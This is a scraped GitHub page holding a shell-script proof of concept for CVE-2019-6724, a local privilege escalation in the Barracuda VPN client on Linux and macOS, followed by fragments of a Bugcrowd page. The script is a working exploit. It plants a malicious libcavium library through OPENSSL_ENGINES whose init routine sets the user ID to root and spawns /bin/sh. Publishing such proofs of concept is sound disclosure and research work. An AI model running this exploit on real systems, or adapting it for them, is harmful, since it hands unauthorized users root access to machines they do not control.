    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fmirchr%2Fsecurity-research%2Fblob%2Fmaster%2Fvulnerabilities%2FCVE-2019-6724.sh)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fblob%2Fshow&source=header-repo&source_repo=mirchr%2Fsecurity-research)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[mirchr](/mirchr)
/
**[security-research](/mirchr/security-research)**
Public

* [Notifications](/login?return_to=%2Fmirchr%2Fsecurity-research) You must be signed in to change notification settings
* [Fork
  27](/login?return_to=%2Fmirchr%2Fsecurity-research)
* [Star
   95](/login?return_to=%2Fmirchr%2Fsecurity-research)

* [Code](/mirchr/security-research)
* [Issues
  0](/mirchr/security-research/issues)
* [Pull requests
  0](/mirchr/security-research/pulls)
* [Actions](/mirchr/security-research/actions)
* [Projects
  0](/mirchr/security-research/projects)
* [Security](/mirchr/security-research/security)
* [Insights](/mirchr/security-research/pulse)

Additional navigation options

* [Code](/mirchr/security-research)
* [Issues](/mirchr/security-research/issues)
* [Pull requests](/mirchr/security-research/pulls)
* [Actions](/mirchr/security-research/actions)
* [Projects](/mirchr/security-research/projects)
* [Security](/mirchr/security-research/security)
* [Insights](/mirchr/security-research/pulse)

## Files

 master
## Breadcrumbs

1. [security-research](/mirchr/security-research/tree/master)
2. /[vulnerabilities](/mirchr/security-research/tree/master/vulnerabilities)
/
# CVE-2019-6724.sh

Copy path Blame  Blame
## Latest commit

## History

[History](/mirchr/security-research/commits/master/vulnerabilities/CVE-2019-6724.sh)executable file·50 lines (41 loc) · 965 Bytes master
## Breadcrumbs

1. [security-research](/mirchr/security-research/tree/master)
2. /[vulnerabilities](/mirchr/security-research/tree/master/vulnerabilities)
/
# CVE-2019-6724.sh

Top
## File metadata and controls

* Code
* Blame

executable file·50 lines (41 loc) · 965 Bytes[Raw](https://github.com/mirchr/security-research/raw/refs/heads/master/vulnerabilities/CVE-2019-6724.sh)1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950#!/bin/sh# PoC for CVE-2019-6724 Barracuda VPN Client Privilege Escalation# Linux / macOS# Rich Mirch## Version tested:## Barracuda Networks VPN client version: PhionVersionString 5.0.2.5## OS tested:## CentOS Linux release 7.4.1708 (Core)# macOS 10.14.2#
STAGE=$(mktemp -d /tmp/woot.XXXXXX)
cd ${STAGE?} || exit 1
export OPENSSL\_ENGINES=${STAGE?}
cat >woot.c<<EOF#include <stdlib.h>#include <sys/types.h>#include <unistd.h>
void woot(){ setreuid(0,0); execl("/bin/sh","/bin/sh",NULL);}EOF
u=$(uname)
gcc -fPIC -o woot.o -Wall -c woot.c
if [[ $u = "Linux" ]]then gcc -Wall -shared -Wl,-soname,libcavium.so -Wl,-init,woot -o ${STAGE?}/libcavium.so woot.o /usr/local/bin/barracudavpnelif [[ $u = "Darwin" ]]then gcc -Wall -dynamiclib -Wl,-init,\_woot -o ${STAGE?}/libcavium.dylib woot.o /Applications/BarracudaVPNClient.app/Contents/MacOS/barracudavpn.engineelse echo "Error: OS not supported" exit 1fi
rm -rf ${STAGE?}

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from blog.mirch.io_39d88133_20250121_032049.html ===



=== Content from bugcrowd.com_5bcdd577_20250121_032051.html ===

[![Bugcrowd logo](https://assets.bugcrowdusercontent.com/assets/shared/bugcrowd-logo-word-mark-f12664098a93b6495fd16fba23aa4c1c7b2619a6b8af60a79c3d553abd7a6a30.svg)](https://www.bugcrowd.com)

* [Hacker Login](https://identity.bugcrowd.com/login?user_hint=researcher&returnTo=https://bugcrowd.com/engagements/barracuda)
* [Customer Login](https://identity.bugcrowd.com/login?user_hint=tracker&returnTo=https://bugcrowd.com/engagements/barracuda)

xml version="1.0" encoding="utf-8"?


